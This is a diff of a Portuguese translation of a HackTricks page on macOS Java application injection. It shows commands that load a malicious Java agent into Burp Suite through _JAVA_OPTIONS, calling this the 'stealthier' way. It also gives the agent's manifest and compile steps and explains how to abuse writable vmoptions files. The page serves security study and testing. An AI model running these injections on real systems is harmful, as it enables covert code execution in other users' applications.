@@ -2,21 +2,21 @@
 
 <details>
 
-<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao avançado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Outras formas de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Participe do grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no GitHub.
 
 </details>
 
 ## Enumeração
 
-Encontre aplicações Java instaladas no seu sistema. Foi observado que aplicações Java no **Info.plist** conterão alguns parâmetros java que incluem a string **`java.`**, então você pode procurar por isso:
+Encontre aplicações Java instaladas em seu sistema. Foi observado que aplicações Java no arquivo **Info.plist** conterão alguns parâmetros Java que contêm a string **`java.`**, então você pode procurar por isso:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -85,7 +85,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-No entanto, isso acionará um erro no aplicativo executado, outra maneira mais discreta é criar um agente java e usar:
+No entanto, isso irá desencadear um erro no aplicativo executado, outra maneira mais furtiva é criar um agente Java e usar:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -95,7 +95,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 {% hint style="danger" %}
-Criar o agente com uma **versão do Java diferente** da aplicação pode causar a falha na execução tanto do agente quanto da aplicação.
+Criar o agente com uma **versão diferente do Java** da aplicação pode causar a falha na execução tanto do agente quanto da aplicação
 {% endhint %}
 
 Onde o agente pode ser:
@@ -117,6 +117,8 @@ err.printStackTrace();
 }
 }
 ```
+{% endcode %}
+
 Para compilar o agente, execute:
 ```bash
 javac Agent.java # Create Agent.class
@@ -129,7 +131,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-E então exporte a variável de ambiente e execute a aplicação java como:
+E então exporte a variável de ambiente e execute a aplicação Java assim:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -138,14 +140,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## arquivo vmoptions
+## Ficheiro vmoptions
 
-Este arquivo suporta a especificação de **parâmetros Java** quando o Java é executado. Você poderia usar algumas das técnicas anteriores para alterar os parâmetros java e **fazer o processo executar comandos arbitrários**.\
-Além disso, este arquivo também pode **incluir outros** com o diretório `include`, então você também poderia alterar um arquivo incluído.
+Este ficheiro suporta a especificação de **parâmetros Java** quando o Java é executado. Pode-se usar alguns dos truques anteriores para alterar os parâmetros Java e **fazer o processo executar comandos arbitrários**.\
+Além disso, este ficheiro também pode **incluir outros** com o diretório `include`, então também poderia alterar um ficheiro incluído.
 
-Ainda mais, algumas aplicações Java irão **carregar mais de um arquivo `vmoptions`**.
+Ainda mais, algumas aplicações Java irão **carregar mais do que um ficheiro `vmoptions`**.
 
-Algumas aplicações como o Android Studio indicam em seu **output onde estão procurando** por esses arquivos, como:
+Algumas aplicações como o Android Studio indicam na sua **saída onde estão à procura** destes ficheiros, como:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -156,7 +158,7 @@ Algumas aplicações como o Android Studio indicam em seu **output onde estão p
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Se não, você pode facilmente verificar com:
+Se não o fizerem, você pode facilmente verificar isso com:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -164,18 +166,4 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Observe como é interessante que o Android Studio, neste exemplo, está tentando carregar o arquivo **`/Applications/Android Studio.app.vmoptions`**, um local onde qualquer usuário do grupo **`admin`** tem acesso de escrita.
-
-<details>
-
-<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Outras formas de apoiar o HackTricks:
-
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Participe do grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
-
-</details>
+Note como é interessante que o Android Studio neste exemplo está tentando carregar o arquivo **`/Applications/Android Studio.app.vmoptions`**, um local onde qualquer usuário do grupo **`admin` tem acesso de escrita.**
